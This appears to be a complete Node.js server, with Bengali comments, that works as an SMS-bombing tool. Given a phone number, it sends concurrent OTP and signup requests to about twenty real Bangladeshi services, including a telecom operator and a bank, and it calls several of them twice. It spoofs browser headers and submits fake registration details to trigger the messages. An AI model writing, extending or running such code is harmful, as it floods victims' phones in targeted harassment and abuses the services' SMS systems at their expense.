const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

// Helper: নম্বর ফরম্যাটিং ফাংশন
function formatNumberForAPI(apiName, number) {
  // এখানে তোমার দেওয়া ফরম্যাট অনুযায়ী নম্বর রূপান্তর করো
  // উদাহরণস্বরূপ:
  switch(apiName) {
    case 'Ghoorilearn':
    case 'OnlyForGP':
    case 'Chokrojan':
    case 'DhakaBank':
    case 'Qcom':
    case 'Apex':
    case 'RabbitHole':
    case 'EasyComBd':
    case 'DeepToPlay':
      return number; // 01XXXXXXXXX ফরম্যাট
    case 'MojaEnglish':
    case 'Quizgiri':
    case 'Osudpotro':
    case 'Quiztime':
    case 'Redx':
    case 'RangsEcom':
    case 'SwapBD':
      return number.startsWith('01') ? '+880' + number.slice(1) : number; // +8801XXXXXXXXX ফরম্যাট
    case 'Bikroy':
      return number; // URL এ সরাসরি যাবে
    case 'Cineplex':
      return number; // 01XXXXXXXXX
    default:
      return number;
  }
}

// API রিকোয়েস্ট ফাংশনগুলো
async function callGhoorilearn(number) {
  const url = 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn';
  const headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Content-Type": "application/json",
    "Referer": "https://ghoorilearning.com/",
    "Origin": "https://ghoorilearning.com"
  };
  const body = { mobile_no: number };
  return axios.post(url, body, { headers });
}

async function callOnlyForGP(number) {
  const url = 'https://weblogin.grameenphone.com/backend/api/v1/otp';
  const headers = { "Content-Type": "application/json" };
  const body = { msisdn: number };
  return axios.post(url, body, { headers });
}

async function callMojaEnglish(number) {
  const url = 'https://api.englishmojabd.com/api/v1/auth/login';
  const headers = { "Content-Type": "application/json" };
  const body = { phone: number };
  return axios.post(url, body, { headers });
}

async function callChokrojan(number) {
  const url = 'https://chokrojan.com/api/v1/passenger/login/mobile';
  const headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "domain-name": "chokrojan.com",
    "user-platform": "3",
    "company-id": "1",
    "Origin": "https://chokrojan.com",
    "Referer": "https://chokrojan.com/login",
    "Content-Type": "application/json"
  };
  const body = { mobile_number: number };
  return axios.post(url, body, { headers });
}

async function callDhakaBank(number) {
  const url = 'https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber';
  const headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
  };
  const body = {
    AccessToken: "",
    TrackingNo: "",
    mobileNo: number,
    otpSms: "",
    product_id: "250",
    requestChannel: "MOB",
    trackingStatus: 5
  };
  return axios.post(url, body, { headers });
}

async function callQuizgiri(number) {
  const url = 'https://developer.quizgiri.xyz/api/v2.0/send-otp?';
  const headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Content-Type": "application/json"
  };
  const body = {
    country_code: "+880",
    phone: number
  };
  return axios.post(url, body, { headers });
}

async function callOsudpotro(number) {
  const url = 'https://api.osudpotro.com/api/v1/users/send_otp';
  const headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
  };
  const body = {
    mobile: number,
    deviceToken: "app",
    language: "bn",
    os: "android"
  };
  return axios.post(url, body, { headers });
}

async function callQuiztime(number) {
  const url = 'https://quiztime.com/api/send-otp'; // তোমার দেওয়া URL-এ একটু ভিন্নতা থাকতে পারে, ঠিক করে দিবে
  const headers = { "Content-Type": "application/json" };
  const body = {
    country_code: "+88",
    phone: number
  };
  return axios.post(url, body, { headers });
}

async function callQcom(number) {
  const url = 'https://auth.qcoom.com/api/v1/otp/send';
  const headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Referer": "https://qcoom.com/",
    "Content-Type": "application/json"
  };
  const body = { mobileNumber: number };
  return axios.post(url, body, { headers });
}

async function callRedx(number) {
  const url = 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp';
  const body = { phoneNumber: number };
  return axios.post(url, body);
}

async function callBikroy(number) {
  const url = `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${number}`;
  return axios.get(url);
}

async function callCineplex(number) {
  const url = 'https://cineplex-ticket-api.cineplexbd.com/api/v1/otp-resend?r_token=jycbgygsecsgcfhsgcvysegfgrr46rrgve4urv64iu6';
  const headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Content-Type": "application/json"
  };
  const body = {
    r_token: "jycbgygsecsgcfhsgcvysegfgrr46rrgve4urv64iu6",
    msisdn: number
  };
  return axios.post(url, body, { headers });
}

async function callApex(number) {
  const url = 'https://api.apex4u.com/api/auth/login';
  const headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
  };
  const body = { phoneNumber: number };
  return axios.post(url, body, { headers });
}

async function callRabbitHole(number) {
  const url = 'https://apix.rabbitholebd.com/appv2/login/requestOTP';
  const body = { mobile: number };
  return axios.post(url, body);
}

async function callEasyComBd(number) {
  const url = 'https://core.easy.com.bd/api/v1/registration';
  const body = {
    name: "Shahidul Islam",
    email: "uyrlhkgxqw@emergentvillage.org",
    mobile: number,
    password: "boss#2022",
    password_confirmation: "boss#2022",
    device_key: "9a28ae67c5704e1fcb50a8fc4ghjea4d"
  };
  return axios.post(url, body);
}

async function callGrameenphoneBKShop(number) {
  const url = 'https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp';
  const body = {
    phone: number,
    email: "kallueas@gmail.com",
    language: "en"
  };
  return axios.post(url, body);
}

async function callPaperfly(number) {
  const url = 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php';
  const body = {
    full_name: "Hangama",
    company_name: "Hangama",
    email_address: "hangama@gmail.com",
    phone_number: number
  };
  return axios.post(url, body);
}

async function callDeepToPlay(number) {
  const url = 'https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web';
  const body = { number: number };
  return axios.post(url, body);
}

async function callRangsEcom(number) {
  const url = 'https://ecom.rangs.com.bd/send-otp-code';
  const body = { mobile: number };
  return axios.post(url, body);
}

async function callSwapBD(number) {
  const url = 'https://api.swap.com.bd/api/v1/send-otp';
  const body = { phone_number: number };
  return axios.post(url, body);
}

// Main API route
app.post('/send-otp', async (req, res) => {
  try {
    let inputNumber = req.body.number;
    if (!inputNumber) return res.status(400).json({ error: "Number is required" });

    // Prepare formatted numbers for each API
    const formattedNumbers = {
      Ghoorilearn: formatNumberForAPI('Ghoorilearn', inputNumber),
      OnlyForGP: formatNumberForAPI('OnlyForGP', inputNumber),
      MojaEnglish: formatNumberForAPI('MojaEnglish', inputNumber),
      Chokrojan: formatNumberForAPI('Chokrojan', inputNumber),
      DhakaBank: formatNumberForAPI('DhakaBank', inputNumber),
      Quizgiri: formatNumberForAPI('Quizgiri', inputNumber),
      Osudpotro: formatNumberForAPI('Osudpotro', inputNumber),
      Quiztime: formatNumberForAPI('Quiztime', inputNumber),
      Qcom: formatNumberForAPI('Qcom', inputNumber),
      Redx: formatNumberForAPI('Redx', inputNumber),
      Bikroy: formatNumberForAPI('Bikroy', inputNumber),
      Cineplex: formatNumberForAPI('Cineplex', inputNumber),
      Apex: formatNumberForAPI('Apex', inputNumber),
      RabbitHole: formatNumberForAPI('RabbitHole', inputNumber),
      EasyComBd: formatNumberForAPI('EasyComBd', inputNumber),
      GrameenphoneBKShop: formatNumberForAPI('GrameenphoneBKShop', inputNumber),
      Paperfly: formatNumberForAPI('Paperfly', inputNumber),
      DeepToPlay: formatNumberForAPI('DeepToPlay', inputNumber),
      RangsEcom: formatNumberForAPI('RangsEcom', inputNumber),
      SwapBD: formatNumberForAPI('SwapBD', inputNumber)
    };

    // Prepare promises array for concurrent requests
    const promises = [];

    // APIs to call once
    promises.push(callGhoorilearn(formattedNumbers.Ghoorilearn));
    promises.push(callOnlyForGP(formattedNumbers.OnlyForGP));
    promises.push(callMojaEnglish(formattedNumbers.MojaEnglish));
    promises.push(callChokrojan(formattedNumbers.Chokrojan));
    promises.push(callDhakaBank(formattedNumbers.DhakaBank));
    promises.push(callQuizgiri(formattedNumbers.Quizgiri));
    promises.push(callQuiztime(formattedNumbers.Quiztime));
    promises.push(callQcom(formattedNumbers.Qcom));
    promises.push(callRedx(formattedNumbers.Redx));
    promises.push(callBikroy(formattedNumbers.Bikroy));
    promises.push(callCineplex(formattedNumbers.Cineplex));
    promises.push(callApex(formattedNumbers.Apex));
    promises.push(callGrameenphoneBKShop(formattedNumbers.GrameenphoneBKShop));
    promises.push(callPaperfly(formattedNumbers.Paperfly));
    promises.push(callRangsEcom(formattedNumbers.RangsEcom));
    promises.push(callSwapBD(formattedNumbers.SwapBD));

    // APIs to call twice
    promises.push(callOsudpotro(formattedNumbers.Osudpotro));
    promises.push(callOsudpotro(formattedNumbers.Osudpotro));
    promises.push(callRabbitHole(formattedNumbers.RabbitHole));
    promises.push(callRabbitHole(formattedNumbers.RabbitHole));
    promises.push(callEasyComBd(formattedNumbers.EasyComBd));
    promises.push(callEasyComBd(formattedNumbers.EasyComBd));
    promises.push(callDeepToPlay(formattedNumbers.DeepToPlay));
    promises.push(callDeepToPlay(formattedNumbers.DeepToPlay));

    // Await all requests concurrently
    const results = await Promise.allSettled(promises);

    // Prepare response summary
    const responseSummary = results.map((result, idx) => {
      if (result.status === 'fulfilled') {
        return { index: idx + 1, status: 'success', data: result.value.data || null };
      } else {
        return { index: idx + 1, status: 'failed', reason: result.reason.message || result.reason };
      }
    });

    res.json({ message: "OTP requests sent", results: responseSummary });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});